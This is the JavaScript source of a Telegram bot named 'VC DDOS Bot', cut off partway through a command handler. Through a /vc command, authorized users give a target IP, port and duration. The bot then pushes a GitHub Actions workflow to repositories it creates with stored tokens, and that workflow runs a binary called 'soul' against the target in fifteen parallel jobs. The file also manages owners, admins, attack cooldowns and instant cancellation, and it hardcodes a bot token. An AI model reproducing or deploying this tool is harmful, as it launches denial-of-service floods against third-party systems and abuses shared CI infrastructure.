import fs from 'fs';
import path from 'path';
import { Telegraf } from 'telegraf';
import { Octokit } from '@octokit/rest';
import axios from 'axios';
import { fileURLToPath } from 'url';

// Get __dirname in ES module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configure logging
const logger = {
    info: (msg) => console.log(`[INFO] ${new Date().toISOString()} - ${msg}`),
    error: (msg) => console.error(`[ERROR] ${new Date().toISOString()} - ${msg}`)
};

// Configuration - TWO OWNERS (MAIN OWNER + SECOND OWNER)
const BOT_TOKEN = "7833338001:AAFbfDMk96V2ZyC3beOc0bwAkxZkM";
const YML_FILE_PATH = ".github/workflows/main.yml";
const BINARY_FILE_NAME = "soul";
const ADMIN_IDS = [1817896911, 7733336238];  // Yeh dono ID owners hain
const MAIN_OWNER_ID = 1817896911;  // Main owner ki ID

// Load additional admins from JSON
function loadAdmins() {
    try {
        if (fs.existsSync('admins.json')) {
            const data = fs.readFileSync('admins.json', 'utf8');
            return JSON.parse(data);
        } else {
            // Start with empty admins list
            saveAdmins([]);
            return [];
        }
    } catch (error) {
        logger.error(`Error loading admins: ${error}`);
        return [];
    }
}

function saveAdmins(admins) {
    try {
        fs.writeFileSync('admins.json', JSON.stringify(admins, null, 2));
    } catch (error) {
        logger.error(`Error saving admins: ${error}`);
    }
}

// Load users from JSON file
function loadUsers() {
    try {
        if (fs.existsSync('users.json')) {
            const data = fs.readFileSync('users.json', 'utf8');
            const usersData = JSON.parse(data);
            if (!usersData || usersData.length === 0) {
                // Initialize with both admin IDs
                const initialUsers = [...ADMIN_IDS];
                saveUsers(initialUsers);
                return new Set(initialUsers);
            }
            return new Set(usersData);
        } else {
            // Create new with both admin IDs
            const initialUsers = [...ADMIN_IDS];
            saveUsers(initialUsers);
            return new Set(initialUsers);
        }
    } catch (error) {
        logger.error(`Error loading users: ${error}`);
        const initialUsers = [...ADMIN_IDS];
        saveUsers(initialUsers);
        return new Set(initialUsers);
    }
}

function saveUsers(users) {
    try {
        fs.writeFileSync('users.json', JSON.stringify(Array.from(users)));
    } catch (error) {
        logger.error(`Error saving users: ${error}`);
    }
}

// Load GitHub tokens from JSON file
function loadGithubTokens() {
    try {
        if (fs.existsSync('github_tokens.json')) {
            const data = fs.readFileSync('github_tokens.json', 'utf8');
            return JSON.parse(data);
        } else {
            return [];
        }
    } catch (error) {
        logger.error(`Error loading GitHub tokens: ${error}`);
        return [];
    }
}

function saveGithubTokens(tokens) {
    try {
        fs.writeFileSync('github_tokens.json', JSON.stringify(tokens, null, 2));
    } catch (error) {
        logger.error(`Error saving GitHub tokens: ${error}`);
    }
}

// Load attack state
function loadAttackState() {
    try {
        if (fs.existsSync('attack_state.json')) {
            const data = fs.readFileSync('attack_state.json', 'utf8');
            return JSON.parse(data);
        } else {
            return { current_attack: null, cooldown_until: 0 };
        }
    } catch (error) {
        logger.error(`Error loading attack state: ${error}`);
        return { current_attack: null, cooldown_until: 0 };
    }
}

function saveAttackState() {
    try {
        const state = {
            current_attack: currentAttack,
            cooldown_until: cooldownUntil
        };
        fs.writeFileSync('attack_state.json', JSON.stringify(state, null, 2));
    } catch (error) {
        logger.error(`Error saving attack state: ${error}`);
    }
}

// Global variables for attack management
let currentAttack = null;
let cooldownUntil = 0;
const COOLDOWN_DURATION = 40;  // 40 seconds cooldown after attack finishes

// Initialize authorized users, GitHub tokens, and admins
let authorizedUsers = loadUsers();
let githubTokens = loadGithubTokens();
let additionalAdmins = loadAdmins();

// Load attack state
const attackState = loadAttackState();
currentAttack = attackState.current_attack;
cooldownUntil = attackState.cooldown_until || 0;

function isMainOwner(userId) {
    return userId === MAIN_OWNER_ID;
}

function isAdmin(userId) {
    return ADMIN_IDS.includes(userId) || additionalAdmins.includes(userId);
}

function isOwner(userId) {
    return ADMIN_IDS.includes(userId);
}

function isOwnerOrAdmin(userId) {
    return ADMIN_IDS.includes(userId) || additionalAdmins.includes(userId);
}

function canStartAttack() {
    if (currentAttack !== null) {
        return { canStart: false, message: "🚫 **Attack Already Running!**\n\nPlease wait for current attack to finish and 40 seconds cooldown." };
    }
    
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime < cooldownUntil) {
        const remainingTime = cooldownUntil - currentTime;
        return { canStart: false, message: `⏳ **Cooldown Period!**\n\nPlease wait ${remainingTime} seconds before starting new attack.` };
    }
    
    return { canStart: true, message: "Ready for new attack" };
}

function startAttack(ip, port, timeVal, userId) {
    currentAttack = {
        ip: ip,
        port: port,
        time: timeVal,
        user_id: userId,
        start_time: Math.floor(Date.now() / 1000),
        estimated_end_time: Math.floor(Date.now() / 1000) + parseInt(timeVal)
    };
    saveAttackState();
}

function finishAttack() {
    currentAttack = null;
    cooldownUntil = Math.floor(Date.now() / 1000) + COOLDOWN_DURATION;
    saveAttackState();
}

function stopAttack() {
    currentAttack = null;
    cooldownUntil = Math.floor(Date.now() / 1000) + COOLDOWN_DURATION;
    saveAttackState();
}

function getAttackStatus() {
    if (currentAttack !== null) {
        const currentTime = Math.floor(Date.now() / 1000);
        const elapsed = currentTime - currentAttack.start_time;
        const remaining = Math.max(0, currentAttack.estimated_end_time - currentTime);
        
        return {
            status: "running",
            attack: currentAttack,
            elapsed: elapsed,
            remaining: remaining
        };
    }
    
    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime < cooldownUntil) {
        const remainingCooldown = cooldownUntil - currentTime;
        return {
            status: "cooldown",
            remaining_cooldown: remainingCooldown
        };
    }
    
    return { status: "ready" };
}

async function createRepository(token, repoName = "vc-ddos-bot") {
    try {
        const octokit = new Octokit({ auth: token });
        
        try {
            const { data: user } = await octokit.rest.users.getAuthenticated();
            
            try {
                const { data: repo } = await octokit.rest.repos.get({
                    owner: user.login,
                    repo: repoName
                });
                return { repo, created: false };
            } catch (error) {
                if (error.status === 404) {
                    const { data: repo } = await octokit.rest.repos.createForAuthenticatedUser({
                        name: repoName,
                        description: "VC DDOS Bot Repository",
                        private: false,
                        auto_init: false
                    });
                    return { repo, created: true };
                }
                throw error;
            }
        } catch (error) {
            throw new Error(`Failed to create repository: ${error.message}`);
        }
    } catch (error) {
        throw new Error(`Failed to create repository: ${error.message}`);
    }
}

async function updateYmlFile(token, repoName, ip, port, timeVal) {
    const ymlContent = `name: Soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul ${ip} ${port} ${timeVal}
`;
    
    try {
        const octokit = new Octokit({ auth: token });
        const [owner, repo] = repoName.split('/');
        
        try {
            const { data: fileContent } = await octokit.rest.repos.getContent({
                owner,
                repo,
                path: YML_FILE_PATH
            });
            
            await octokit.rest.repos.createOrUpdateFileContents({
                owner,
                repo,
                path: YML_FILE_PATH,
                message: `Update attack parameters - ${ip}:${port}`,
                content: Buffer.from(ymlContent).toString('base64'),
                sha: fileContent.sha
            });
            
            logger.info(`✅ Updated configuration for ${repoName}`);
            return true;
        } catch (error) {
            if (error.status === 404) {
                await octokit.rest.repos.createOrUpdateFileContents({
                    owner,
                    repo,
                    path: YML_FILE_PATH,
                    message: `Create attack parameters - ${ip}:${port}`,
                    content: Buffer.from(ymlContent).toString('base64')
                });
                
                logger.info(`✅ Created configuration for ${repoName}`);
                return true;
            }
            throw error;
        }
    } catch (error) {
        logger.error(`❌ Error for ${repoName}: ${error.message}`);
        return false;
    }
}

async function instantStopAllJobs(token, repoName) {
    try {
        const octokit = new Octokit({ auth: token });
        const [owner, repo] = repoName.split('/');
        
        const runningStatuses = ['queued', 'in_progress', 'pending'];
        let totalCancelled = 0;
        
        for (const status of runningStatuses) {
            try {
                const { data: workflows } = await octokit.rest.actions.listWorkflowRunsForRepo({
                    owner,
                    repo,
                    status: status,
                    per_page: 100
                });
                
                for (const workflow of workflows.workflow_runs) {
                    try {
                        await octokit.rest.actions.cancelWorkflowRun({
                            owner,
                            repo,
                            run_id: workflow.id
                        });
                        totalCancelled++;
                        logger.info(`✅ INSTANT STOP: Cancelled ${status} workflow ${workflow.id} for ${repoName}`);
                    } catch (error) {
                        logger.error(`❌ Error cancelling workflow ${workflow.id}: ${error.message}`);
                    }
                }
            } catch (error) {
                logger.error(`❌ Error getting ${status} workflows: ${error.message}`);
            }
        }
        
        return totalCancelled;
    } catch (error) {
        logger.error(`❌ Error accessing ${repoName}: ${error.message}`);
        return 0;
    }
}

// Create bot instance
const bot = new Telegraf(BOT_TOKEN);

// Middleware to check authorization
bot.use(async (ctx, next) => {
    if (ctx.updateType === 'message' || ctx.updateType === 'callback_query') {
        const userId = ctx.from.id;
        if (!authorizedUsers.has(userId)) {
            if (ctx.updateType === 'message') {
                await ctx.reply("❌ You are not authorized to use this bot.");
            }
            return;
        }
    }
    await next();
});

// Command handlers
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const attackStatus = getAttackStatus();
    
    if (attackStatus.status === "running") {
        const attack = attackStatus.attack;
        await ctx.reply(
            `🚫 **Attack Currently Running**\n\n` +
            `• 🎯 Target: \`${attack.ip}:${attack.port}\`\n` +
            `• ⏰ Time: \`${attack.time}\`\n` +
            `• ⏱️ Elapsed: \`${attackStatus.elapsed}s\`\n` +
            `• 🕐 Remaining: \`${attackStatus.remaining}s\`\n\n` +
            `**Please wait for current attack to finish and 40 seconds cooldown.**`
        );
        return;
    }
    
    if (attackStatus.status === "cooldown") {
        await ctx.reply(
            `⏳ **Cooldown Period**\n\n` +
            `Please wait \`${attackStatus.remaining_cooldown}s\` before starting new attack.`
        );
        return;
    }
    
    const isMain = isMainOwner(userId);
    const isOwnerUser = isOwner(userId);
    const isAdminUser = isAdmin(userId);
    
    let userType;
    if (isMain) {
        userType = "👑 **You are the MAIN OWNER**";
    } else if (isOwnerUser) {
        userType = "👑 **You are an OWNER**";
    } else if (isAdminUser) {
        userType = "👤 **You are an ADMIN**";
    } else {
        userType = "👤 **You are an AUTHORIZED USER**";
    }
    
    const welcomeMessage = `🚀 **Welcome to VC DDOS Bot** 🚀

${userType}

Available Commands:
/vc <ip> <port> <time> - Start attack from all VPS servers
/stop - Stop all attacks instantly
/status - Check current attack status
/add <user_id> - Add authorized user (Owner/Admin only)
/remove <user_id> - Remove authorized user (Owner/Admin only)
/users - List authorized users
/stats - Bot statistics (Owner/Admin only)
/add_admin <user_id> - Make user admin (Main Owner only)
/remove_admin <user_id> - Remove admin privileges (Main Owner only)
/admins - List all admins (Owner/Admin only)

**Note:** 
• Only one attack can run at a time
• 40 seconds cooldown after attack finishes`;
    
    await ctx.reply(welcomeMessage);
});

// /add_admin command - Make user admin (Main Owner only)
bot.command('add_admin', async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ').slice(1);
    
    if (!isMainOwner(userId)) {
        await ctx.reply("❌ Only the MAIN OWNER can make users admin.");
        return;
    }
    
    if (args.length !== 1) {
        await ctx.reply("❌ Usage: /add_admin <user_id>");
        return;
    }
    
    try {
        const newAdminId = parseInt(args[0]);
        
        if (isNaN(newAdminId)) {
            await ctx.reply("❌ Invalid user ID.");
            return;
        }
        
        // Check if trying to add an owner as admin
        if (isOwner(newAdminId)) {
            await ctx.reply("❌ This user is already an owner.");
            return;
        }
        
        // Check if already admin
        if (additionalAdmins.includes(newAdminId)) {
            await ctx.reply("❌ This user is already an admin.");
            return;
        }
        
        // Check if user exists in authorized users
        if (!authorizedUsers.has(newAdminId)) {
            // Auto add user if not exists
            authorizedUsers.add(newAdminId);
            saveUsers(authorizedUsers);
            await ctx.reply(`✅ User \`${newAdminId}\` added to authorized users first.`);
        }
        
        // Add as admin
        additionalAdmins.push(newAdminId);
        saveAdmins(additionalAdmins);
        
        await ctx.reply(`✅ User \`${newAdminId}\` has been promoted to ADMIN!`);
        
        // Send notification to the new admin
        try {
            await ctx.telegram.sendMessage(
                newAdminId,
                "🎉 **Congratulations! You have been promoted to ADMIN!** 🎉\n\n" +
                "Now you have access to all admin commands:\n" +
                "• /add <user_id> - Add authorized users\n" +
                "• /remove <user_id> - Remove authorized users\n" +
                "• /stats - View bot statistics\n" +
                "• /admins - View all admins\n\n" +
                "You can also use all regular user commands!\n\n" +
                "Thank you for being part of our team! 💪"
            );
        } catch (error) {
            // Ignore if we can't message the user
        }
        
    } catch (error) {
        await ctx.reply("❌ Invalid user ID.");
    }
});

// /remove_admin command - Remove admin privileges but keep as user (Main Owner only)
bot.command('remove_admin', async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ').slice(1);
    
    if (!isMainOwner(userId)) {
        await ctx.reply("❌ Only the MAIN OWNER can remove admin privileges.");
        return;
    }
    
    if (args.length !== 1) {
        await ctx.reply("❌ Usage: /remove_admin <user_id>");
        return;
    }
    
    try {
        const adminIdToRemove = parseInt(args[0]);
        
        if (isNaN(adminIdToRemove)) {
            await ctx.reply("❌ Invalid user ID.");
            return;
        }
        
        // Check if trying to remove an owner
        if (isOwner(adminIdToRemove)) {
            await ctx.reply("❌ Cannot remove owner's admin privileges.");
            return;
        }
        
        // Check if user is actually an admin
        const adminIndex = additionalAdmins.indexOf(adminIdToRemove);
        if (adminIndex === -1) {
            await ctx.reply("❌ This user is not an admin.");
            return;
        }
        
        // Remove from admin list but keep as user
        additionalAdmins.splice(adminIndex, 1);
        saveAdmins(additionalAdmins);
        
        await ctx.reply(`✅ Admin privileges removed from \`${adminIdToRemove}\`!`);
        
        // Send message to removed admin
        try {
            await ctx.telegram.sendMessage(
                adminIdToRemove,
                "⚠️ **Your admin privileges have been removed!** ⚠️\n\n" +
                "You are no longer an admin of VC DDOS Bot.\n" +
                "You can still use the bot as a regular user.\n" +
                "If you want to become admin again, contact @Shubham_chity"
            );
        } catch (error) {
            // Ignore if we can't message the user
        }
        
    } catch (error) {
        await ctx.reply("❌ Invalid user ID.");
    }
});

// /admins command to list all admins
bot.command('admins', async (ctx) => {
    const userId = ctx.from.id;
    
    if (!isOwnerOrAdmin(userId)) {
        await ctx.reply("❌ Only owners and admins can view admin list.");
        return;
    }
    
    const allAdmins = [...ADMIN_IDS, ...additionalAdmins];
    
    if (allAdmins.length === 0) {
        await ctx.reply("📝 No admins found.");
        return;
    }
    
    let adminsList = "👑 **Administrators List:**\n\n";
    
    // List main owner
    adminsList += `👑 **MAIN OWNER:**\n• \`${MAIN_OWNER_ID}\` (Main Owner)\n\n`;
    
    // List other owners
    const otherOwners = ADMIN_IDS.filter(id => id !== MAIN_OWNER_ID);
    if (otherOwners.length > 0) {
        adminsList += "👑 **OWNERS:**\n";
        otherOwners.forEach(ownerId => {
            adminsList += `• \`${ownerId}\` (Owner)\n`;
        });
        adminsList += "\n";
    }
    
    // List additional admins
    if (additionalAdmins.length > 0) {
        adminsList += "👤 **ADDITIONAL ADMINS:**\n";
        additionalAdmins.forEach(adminId => {
            adminsList += `• \`${adminId}\` (Admin)\n`;
        });
        adminsList += "\n";
    }
    
    adminsList += `📊 **Total Administrators:** ${allAdmins.length}`;
    await ctx.reply(adminsList);
});

// /add command - Owners and Admins can add users
bot.command('add', async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ').slice(1);
    
    if (!isOwnerOrAdmin(userId)) {
        await ctx.reply("❌ Only owners and admins can add users.");
        return;
    }
    
    if (args.length !== 1) {
        await ctx.reply("❌